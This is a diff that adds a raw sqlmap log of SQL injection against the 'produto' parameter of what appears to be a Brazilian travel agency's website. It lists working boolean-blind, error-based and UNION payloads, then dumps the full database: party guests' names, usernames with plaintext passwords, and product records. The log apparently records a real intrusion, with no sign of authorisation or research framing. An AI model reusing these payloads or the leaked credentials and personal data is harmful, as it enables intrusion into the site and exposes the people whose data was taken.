@@ -1,0 +1,212 @@
+sqlmap identified the following injection point(s) with a total of 98 HTTP(s) requests:
+---
+Parameter: produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto=682 AND 4764=4764
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto=682 AND (SELECT 4849 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(4849=4849,1))),0x71767a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: produto=682 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6b71,0x42467961784567594e59784e4e48627078766365776342634950554a79455963756c457567755270,0x71767a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RNkv
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] interfly_banco
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto=682 AND 4764=4764
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto=682 AND (SELECT 4849 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(4849=4849,1))),0x71767a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: produto=682 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6b71,0x42467961784567594e59784e4e48627078766365776342634950554a79455963756c457567755270,0x71767a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RNkv
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: interfly_banco
+[6 tables]
++--------------+
+| categoria    |
+| convidados   |
+| festa        |
+| galeria      |
+| produto      |
+| subcategoria |
++--------------+
+
+Database: interfly_banco
++--------------+---------+
+| Table        | Entries |
++--------------+---------+
+| convidados   | 34      |
+| produto      | 22      |
+| festa        | 8       |
+| subcategoria | 2       |
+| categoria    | 1       |
++--------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto=682 AND 4764=4764
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto=682 AND (SELECT 4849 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(4849=4849,1))),0x71767a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: produto=682 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6b71,0x42467961784567594e59784e4e48627078766365776342634950554a79455963756c457567755270,0x71767a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RNkv
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: interfly_banco
+[6 tables]
++--------------+
+| categoria    |
+| convidados   |
+| festa        |
+| galeria      |
+| produto      |
+| subcategoria |
++--------------+
+
+Database: interfly_banco
+Table: categoria
+[1 entry]
++--------------+-----------+-----------------+
+| id_categoria | tx_link   | tx_nome         |
++--------------+-----------+-----------------+
+| 38           | promocoes | Promo\xe7\xf5es |
++--------------+-----------+-----------------+
+
+Database: interfly_banco
+Table: convidados
+[34 entries]
++----+---------+---------------------------+------------+-----------------------+
+| id | festaid | nome                      | data       | fantasia              |
++----+---------+---------------------------+------------+-----------------------+
+| 9  | 6       | Laurent                   | 12/12/2012 | Homem Aranha          |
+| 10 | 6       | João                      | 26/08/2015 | Homem de Ferro        |
+| 11 | 7       | LUANA ANIVERSARIANTE      | 27/08/16   | jack sparrow          |
+| 12 | 7       | LUANA CONVIDADA           | 27/08/16   | CHAPELEIRA MALUCA     |
+| 13 | 7       | LUANA CONVIDADA           | 27/08/16   | VAMPIRO CREPUSCULO    |
+| 14 | 8       | LEONARDO ANIVERSARIANTE   | 17/09/16   | FARAÓ                 |
+| 15 | 8       | LEONARDO CONVIDADO        | 17/09/16   | GREGO LUXO            |
+| 16 | 8       | MARIA CONVIDADA           | 17/09/16   | GREGA LUXO            |
+| 17 | 8       | CRISTIANE APARECIDA       | 19/09/16   | PRESIDIÁRIA           |
+| 18 | 8       | MICHELE ADRIANA CONVIDADA | 17/09/16   | MULHER MARAVILHA LUXO |
+| 19 | 9       | NATHALIA NIVERSARIANTE    | 15/10/16   | RAINHA DE COPAS       |
+| 20 | 9       | NATHALIA CONVIDADA        | 15/10/16   | BELLA                 |
+| 21 | 9       | VANESSA CONVIDADA         | 15/10/16   | CHAPEUZINHO VERMELHO  |
+| 22 | 9       | VANESSA CONVIDADA         | 15/10/16   | DRÁCULA INFANTIL      |
+| 23 | 9       | VANESSA CONVIDADA         | 15/10/16   | COELHINHA DA PLAY BOY |
+| 24 | 10      | JULIA ANIVERSARIANTE      | 10/09/16   | ARLEQUINA             |
+| 25 | 10      | JULIA CONVIDADA           | 10/09/16   | SUPER MULHER          |
+| 26 | 11      | MATHEUS ANIVERSARIANTE    | 27/01/17   | DOMADOR               |
+| 27 | 11      | DAYANE                    | 27/01/17   | RAINHA DE COPAS       |
+| 28 | 11      | RENATA                    | 27/01/17   | MINNIE                |
+| 29 | 11      | LUCIANO                   | 27/01/17   | MARINHEIRA BRANCA     |
+| 33 | 12      | MATTHEUS ANIVERSARIANTE   | 21/01/17   | CORINGA               |
+| 35 | 12      | Simone                    | 21/01/17   | faraó                 |
+| 36 | 11      | Sandra Regina             | 27/01/17   | Morticia              |
+| 37 | 12      | Simone                    | 21/01/17   | mickey                |
+| 38 | 12      | Simone                    | 21/01/17   | Arlequina             |
+| 39 | 12      | Simone                    | 21/01/17   | Marinheira Corselet   |
+| 40 | 12      | Simone                    | 21/01/17   | Rainha de copas       |
+| 41 | 12      | Raquel                    | 07/02/17   | Rainha Pendragon      |
+| 42 | 12      | Renata                    | 07/02/17   | Frei                  |
+| 43 | 12      | Renata                    | 07/02/17   | Alice                 |
+| 44 | 12      | Bruno                     | 06/02/17   | Presidiário           |
+| 45 | 12      | Bruno                     | 06/02/17   | Super Mulher          |
+| 46 | 12      | Gladiadora                | 06/02/17   | Gladiadora shena      |
++----+---------+---------------------------+------------+-----------------------+
+
+Database: interfly_banco
+Table: festa
+[8 entries]
++----+----------------------------+----------+--------------+
+| id | nome                       | senha    | usuario      |
++----+----------------------------+----------+--------------+
+| 6  | Laurent                    | fsdafsda | laurentrudoi |
+| 7  | Aniversário Luana e Arthur | 2016     | luana        |
+| 8  | ANIVERSARIO LEONARDO       | 2016     | leonardo     |
+| 9  | ANIVERSÁRIO NATALIA        | 2016     | NATY         |
+| 10 | ANIVERSARIO JULIA          | 2016     | JULIA        |
+| 11 | ANIVERSARIO MATHEUS        | 2017     | matheus      |
+| 12 | MATTHEUS MARIGO            | 2017     | mattheus     |
+| 13 | FESTA DA EICON             | 123456   | eicon        |
++----+----------------------------+----------+--------------+
+
+Database: interfly_banco
+Table: galeria
+[0 entries]
++----+-------+--------+-----------+-----------+
+| id | thumb | imagem | categoria | descricao |
++----+-------+--------+-----------+-----------+
++----+-------+--------+-----------+-----------+
+
+Database: interfly_banco
+Table: produto
+[22 entries]
++------------+--------------+-----------------+---------+------------------------+-----------+---------------------------+-----------+---------------------------+---------------------------+------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+--------------------------------------+
+| id_produto | id_categoria | id_subcategoria | tx_link | tx_nome                | tx_modelo | tx_imagem                 | tx_codigo | tx_imagem3                | tx_imagem2                | tx_imagem4 | tx_detalhes | tx_descricao                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | tx_referencia | tx_mini_descricao                    |
++------------+--------------+-----------------+---------+------------------------+-----------+---------------------------+-----------+---------------------------+---------------------------+------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+--------------------------------------+
+| 656        | 38           | 137             | NULL    | ORLANDO                | NULL      | TFlU1hikqMtaDH7WRB4u.jpg  | NULL      | Z3GtfwoRNFuqwVqcioPX.jpg  | WF1TeWQdEOjVatoroCYR.jpg  | <blank>    | 0           | <p>Aéreo + 6 diárias</p> \r\n<p>Hotel Maingate Lakeside Resort</p>\r\n<p>Saída: 21/03/2018</p>\r\n\r\n<p>Promoção válida para apartamento quádruplo.</p>\r\n<p>Sujeito a disponibilidade no ato da reserva.Taxas inclusas.</p>\r\n\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                                                                                                                           | NULL          | a partir de 10x R$ 255,00            |
+| 673        | 38           | 137             | NULL    | PUNTA CANA             | NULL      | VRZaUTfTFDA1CchPlDFr.jpg  | NULL      | A1B5Eg4gJo5oHlPBrTuW.jpg  | 6YJg1gt3w2omzeiGEHtX.jpg  | <blank>    | 1           | <p>Aéreo + 5 diárias</p>\r\n<p>Ifa Villas Bavaro Resort - All  inclusive</P>\r\n<p>Traslado aeroporto/hotel/aeroporto.</p>  \r\n<p>A partir de 10x R$ 379,00 sem juros </P>\r\n<p>Saída: 01/04/2018\r\n<p>Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva. Taxas de embarque não inclusas. </p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos!  Tel. 11 4228-1477\r\n                                                                                                                                                        | NULL          | a partir de 10X de R$ 379,00         |
+| 677        | 38           | 137             | NULL    | BUENOS AIRES           | NULL      | bfyZjBucYe9oi6iqRJmQ.jpg  | NULL      | 5D9eOucf7CRKwHbAAjS8.jpg  | XbeGQ5KavklZwbRoeLDJ.jpg  | <blank>    | 1           | <p>Aéreo + 4 noites</p>  \r\n<p>Grand Hotel Orly com café da manhã</p>\r\n<p>Saída: 09/03/18</p>\r\n<p>Preço: a partir de R$ 999,00 (em até 10X sem juros)</p> \r\n<p>Preço por pessoa em apartamento duplo.</p> <p>Sujeito a disponibilidade no ato da reserva. Taxas de embarque não inclusas.</p>\r\n\r\n• Esse e outros destinos você encontra aqui. Consulte-nos! Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                                                      | NULL          | a partir de 10X de 99,00             |
+| 679        | 38           | 138             | NULL    | PORTO SEGURO           | NULL      | zpYygqsqGFuOiLLyUU4v.jpg  | NULL      | 8YNGbbYen8ULid8craT2.jpg  | cHhiDH3lIt84noWLA94H.jpg  | <blank>    | 1           | <p>Aéreo + 7 noites</p>\r\n<p>Hotel Vale Verde com café da manhã</p>\r\n<p>Traslado aeroporto/hotel/aeroporto + City tour </p>\r\n<p>Saída: de 08/04/2018</p>\r\n<p>Preço: a partir de 10x de 88,00 sem juros (boleto ou cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                          | NULL          | a partir de 10X de R$ 88,00          |
+| 680        | 38           | 138             | NULL    | NATAL - RN             | NULL      | NAovWfw5aEgDe65f2vwJ.jpg  | NULL      | UzqEvzSWhfmDor7FjCTk.jpg  | 7gsJKkX47yhuNppndZp9.jpg  | <blank>    | 1           | <p>Aéreo + 7 noites</p>\r\n<p>Yak Beach Hotel com café da manhã</p>\r\n<p>Traslados aeroporto/hotel/aeroporto + city tour com Praia de Pirangi </p>\r\n<p>Saída: 07/04/2018</p>\r\n<p>Preço: a partir de 10x de R$ 168,00 sem juros (boleto ou cartão de crédito). </p>\r\n\r\n<p> Preço para o casal em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                  | NULL          | a partir de 10X de R$ 168,00 o CASAL |
+| 681        | 38           | 138             | NULL    | FORTALEZA - CE         | NULL      | VGLeHr6VeSFVtQyJISd9.jpg  | NULL      | H7uZNb8dRRJSujZP9XrL.jpg  | kXmlx2aDZAbRVHOkeTDE.jpg  | <blank>    | 1           | <p>Aéreo + 7 noites</p>\r\n<p>Hotel Litotal Fortaleza com café da manhã</p>\r\n<p>Traslado aeroporto/hotel/aeroporto + City tour + passeio Praia de Cumbuco </p>\r\n<p>Saída: de 06/04/2018</p>\r\n<p>Preço: a partir de 10x de R$ 103,00 sem juros (boleto ou cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                    | NULL          | a partir de 10X de R$ 103,00         |
+| 682        | 38           | 138             | NULL    | MACEIÓ - AL            | NULL      | TiVEjWoQIykQzYFJOES9.jpeg | NULL      | Nbn48uCmo9K2My1muqLQ.jpg  | PMU9Osopwygm2t2jhrY1.jpg  | <blank>    | 1           | <p>Aéreo + 7 noites</p>\r\n<p>Ritz Praia Hotel Maceió com café da manhã</p>\r\n<p>Traslado aeroporto/hotel/aeroporto + City tour  </p>\r\n<p>Saída: de 06/04/2018</p>\r\n<p>Preço: a partir de 10x de R$ 127,00 sem juros (boleto ou cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n\r\n                                                                          | NULL          | a partir de 10X de R$ 127,00         |
+| 683        | 38           | 138             | NULL    | SAUIPE - BA            | NULL      | 14VcqE9j9I4EeLDby12g.jpg  | NULL      | sIStouAYkEPwNqJlh5Dv.jpg  | fcOYp5yToE4lvJRUqEFq.jpg  | <blank>    | 1           | <p>Aéreo + 5 noites</p>\r\n<p>Sauipe Resorts sistema All inclusive</p>\r\n<p>Traslado aeroporto/hotel/aeroporto </p>\r\n<p>Saída: de 01/04/2018</p>\r\n<p>Preço: a partir de 10x de R$ 252,00 sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                         | NULL          | a partir de 10x de R$ 252,00         |
+| 684        | 38           | 138             | NULL    | FOZ DO IGUAÇU          | NULL      | PDksxrRKV4ntH8PTHCmf.jpg  | NULL      | 1NiUV1sRDQUerTXNDAUR.jpg  | IC7PSlNKML6QvfEKi6mf.jpg  | <blank>    | 1           | <p>Aéreo + 3 noites</p>\r\n<p>Eduardo Hotel com café da manhã</p>\r\n<p>Traslado aeroporto/hotel/aeroporto </p>\r\n<p>Passeio às cataratas do Iguaçu e Itaipu (ingressos não inclusos) + Duty free Argentino.\r\n<p>Saída: de 08/03/2018</p>\r\n<p>Preço: a partir de 10x de R$ 89,00 sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n | NULL          | a partir de 10x R$ 72,00             |
+| 685        | 38           | 137             | NULL    | CURAÇAO ALL IN         | NULL      | RXmGY1YvDJYVg6V5iEQ8.jpg  | NULL      | jj3wdHjzqIpiJuUuAJnx.jpg  | jl6iOcwqZ5wtHA2rWnPh.jpg  | <blank>    | 1           | <p>Aéreo + 5 noites</p>\r\n<p>Sunscape Resort e Cassino All inclusive</p>\r\n<p>Saída: de 03/03\t/2018</p>\r\n<p>Preço: a partir de 10x de R$ 479,00 sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                  | NULL          | a partir de 10x de 479,00            |
+| 686        | 38           | 137             | NULL    | CANCUN ALL IN          | NULL      | JvoUZDowvDtWgGPkINGK.jpeg | NULL      | GrEZ2f1m2YlfwN41k3fG.jpg  | eFJMJp9eUKLtgaZBFd9a.jpg  | <blank>    | 1           | <p>Aéreo + 5 noites</p>\r\n<p>Oásis Palm Resort All inclusive</p>\r\n<p>Saída: de 08/03/2018</p>\r\n<p>Preço: a partir de 10x de R$ 499,00 sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n\r\n                                                                                                                                        | NULL          | a partir de 10x R$ 499,00            |
+| 687        | 38           | 137             | NULL    | ARUBA                  | NULL      | Fvs42UGgq56MDHz5dk4Q.jpg  | NULL      | W3lhOWaSO4dyIPQAHbZ9.jpg  | GDUedj6lzDP7aA22kU6o.JPG  | <blank>    | 1           | <p>Aéreo + 5 noites</p>\r\n<p>Holliday In Resort (sem café)</p>\r\n<p>Saída: de 01/04/2018</p>\r\n<p>Preço: a partir de 10x de R$ 399,00 sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                              | NULL          | a partir de 10x R$ 399,00            |
+| 688        | 38           | 137             | NULL    | NEW YORK               | NULL      | rIYQ6vGumQdN1p8CClQn.jpg  | NULL      | CFQD7nmLIMlAeBStNao2.jpg  | dxGsdsbgfMpunNJxecAA.jpg  | <blank>    | 1           | \r\n<p>Aéreo + 5 noites de hospedagem </p>\r\n<p>Hotel Confort Suites  (sem café)</p>\r\n<p>Saída: de 05/03/2018</p>\r\n<p>Preço: a partir de R$ 3.750,00 em 10x sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n\r\n                                                                                                                  | NULL          | a partir de 10X de R$ 375,00         |
+| 689        | 38           | 137             | NULL    | LAS VEGAS              | NULL      | COHHXfzGAeKWKSTIQC7h.jpg  | NULL      | Q4gqUOJ8cFgAWHDUhwzI.jpg  | uVAshmUCWeitX74UsyrS.jpg  | <blank>    | 1           | <p>Aéreo + 5 noites de hospedagem </p>\r\n<p>Hotel West Gate Las Vegas Resort e Cassino  (sem café)</p>\r\n<p>Saída: de 04/03/2018</p>\r\n<p>Preço: a partir de R$ 2.665,00 em 10x sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                    | NULL          | a partir de 10X de R$ 265,00         |
+| 690        | 38           | 137             | NULL    | MIAMI                  | NULL      | sj2pdOpPUFItOkCdum9z.jpg  | NULL      | 7deYq7OmbOLzuodnjWsC.jpg  | 5JOKlBnDGZ9JM2a3QzR8.jpg  | <blank>    | 1           | \r\n<p>Aéreo + 5 noites de hospedagem </p>\r\n<p>Floridian Hotel (sem café)</p>\r\n<p>Saída: de 04/03/2018</p>\r\n<p>Preço: a partir de R$ 2.750,00 em 10x sem juros (boleto ou cartão de crédito). </p>\r\n<P></P>\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                            | NULL          | a partir de 10X de R$ 275,00         |
+| 691        | 38           | 137             | NULL    | PARIS                  | NULL      | cUcP22l9WitcAzqXcomf.jpg  | NULL      | 689IoqpFQKJlY5zOoNk2.jpg  | JVtefvTIAv773zUXeGXD.jpg  | <blank>    | 1           | <p>Aéreo + 5 dias </p>\r\n<p>Hotel Kyriad Montmartre Porte Clignancourt</p>\r\n<p>Saída: de 05/03/2018</p>\r\n<p>Preço: a partir de 10x de R$ 318,00 sem juros (boleto ou cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                         | NULL          | a partir de 10x 381,00               |
+| 692        | 38           | 137             | NULL    | AFRICA DO SUL          | NULL      | GHNvynMj3VIeI6ltUYaz.jpg  | NULL      | <blank>                   | 2KKqaDd76p7A9V8yeBxh.png  | <blank>    | 1           | <p>Aéreo + 5 dias </p>\r\n<p>Hotel The Devonshire com café </p>\r\n<p>Saída: de 09/03/2018</p>\r\n<p>Preço: a partir de 10x de R$ 248,00 sem juros (boleto ou cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                                     | NULL          | a partir de 10X de R$ 248,00         |
+| 693        | 38           | 137             | NULL    | LISBOA                 | NULL      | jSeucbShLc8nZTtqHlxK.jpg  | NULL      | 4aOGTVNe5q3xkBWNhSjH.jpg  | n74kJoqoP92JAf66WOsw.jpg  | <blank>    | 1           | <p>Aéreo + 4 diárias </p>\r\n<p>Hotel Vip Inn Berna Hotel </p>\r\n<p>Saída: de 08/03/2018</p>\r\n<p>Preço: a partir de 12x de R$ 329,00 sem juros (boleto ou 10 x no cartão). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                                                                         | NULL          | a partir de 12x R$ 329,00            |
+| 694        | 38           | 138             | NULL    | PORTO DE GALINHAS - PE | NULL      | g4oupLR3fPcCECvZCBHZ.jpg  | NULL      | <blank>                   | ICiUhlAw9bOgpMzAOBTS.jpg  | <blank>    | 0           | PORTO DE GALINHAS a partir de 10X de R$ 172,00                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | NULL          | a partir de 10X de R$ 172,00         |
+| 696        | 38           | 138             | NULL    | CALDAS NOVAS           | NULL      | VL8P8HQ7yFECUmcbioOP.jpg  | NULL      | 5jCEYlMVmmvjXwFKwBsD.jpg  | HxBI69qzE8huJgMHZiD9.jpg  | <blank>    | 1           | <p>Aéreo + 3 noites</p>\r\n<p>Hotel Hot Star com café da manhã</p>\r\n<p>Traslado aeroporto/hotel/aeroporto + City tour </p>\r\n<p>Saída: de 07/03/2018</p>\r\n<p>Preço: a partir de 12x de 86,00 sem juros (boleto ou 10x no cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                     | NULL          | a partir de 12X de R$ 83,00          |
+| 697        | 38           | 138             | NULL    | COSTA BRASILIS RESORT  | NULL      | 64QiU3eBwWnzWxn8VE6R.jpeg | NULL      | zwjXYTLz7HBOnr2bkAVP.jpeg | AKnz94LmEYinQKG7A1CC.jpg  | <blank>    | 1           | <p>Aéreo + 7 noites</p>\r\n<p>Costa Brasilis Resort All inclusive </p>\r\n<p>Traslado aeroporto/hotel/aeroporto </p>\r\n<p>Saída: de 13/04/2018</p>\r\n<p>Preço: a partir de 10x de 339,00 sem juros (boleto ou 10x no cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                            | NULL          | a partir de 10X de R$ 339,00         |
+| 699        | 38           | 138             | NULL    | VILA GALÉ CUMBUCO      | NULL      | o26riTrY6XdZY95rtKjg.jpg  | NULL      | BVrxVlUsMFj9aUjvHfOs.jpg  | lcmjvl7rchfF79MyTdZW.jpeg | <blank>    | 0           | <p>Aéreo + 5 noites</p>\r\n<p>Vila Galé Cumbuco All inclusive </p>\r\n<p>Traslado aeroporto/hotel/aeroporto </p>\r\n<p>Saída: 05/04/2018</p>\r\n<p>Preço: a partir de 12x de 259,90 sem juros (boleto, ou 10x no cartão de crédito). </p>\r\n\r\n<p> Preço por pessoa em apartamento duplo, sujeito a disponibilidade no ato da reserva, taxas de embarque não inclusas</p>\r\n• Esse e outros destinos você encontra aqui. Consulte-nos:  Tel. 11 4228-1477 / 94470-7400\r\n                                                                                                  | NULL          | a partir de 12X de R$ 259,90         |
++------------+--------------+-----------------+---------+------------------------+-----------+---------------------------+-----------+---------------------------+---------------------------+------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+--------------------------------------+
+
+Database: interfly_banco
+Table: subcategoria
+[2 entries]
++--------------+-----------------+-------------------+----------------+
+| id_categoria | id_subcategoria | link              | nome           |
++--------------+-----------------+-------------------+----------------+
+| 38           | 137             | Internacionais    | Internacionais |
+| 38           | 138             | promocao-nacional | Nacionais      |
++--------------+-----------------+-------------------+----------------+
+
